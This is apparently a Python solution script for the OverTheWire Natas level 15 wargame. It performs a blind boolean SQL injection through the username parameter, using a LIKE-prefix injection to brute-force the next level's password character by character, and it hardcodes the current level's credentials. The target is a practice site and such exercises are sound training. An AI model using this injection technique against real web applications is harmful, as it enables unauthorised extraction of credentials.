import requests
import string

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
passwordLen = len(password)
bruteforce = string.ascii_letters + string.digits
natas16Pwd = ''
trustStr = 'This user exists.'

url = "http://{}:{}@{}.natas.labs.overthewire.org/index.php".format(username, password, username)

# query = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php?username=natas16"+AND+password+LIKE+"W%'
# print('Query: {}'.format(query))
# print('Respond: {}'.format(respond.text))
# print('Content: {}'.format(content))
# print('Bruteforce: {}'.format(bruteforce))
# print('Password Length: {}'.format(passwordLen))

for size in range(passwordLen):

    print("Round {}/{}".format(size, passwordLen))

    for char in bruteforce:
        query = '{}?username=natas16"+AND+BINARY+password+LIKE+"{}%'.format(url, natas16Pwd+char)
        respond = requests.get(query)
        content = respond.text.find(trustStr) # Not found return -1

        print("Trying: {} {}".format(char, content))

        if content != -1:
            natas16Pwd += char
            print('*************** Found: {}'.format(natas16Pwd))
            break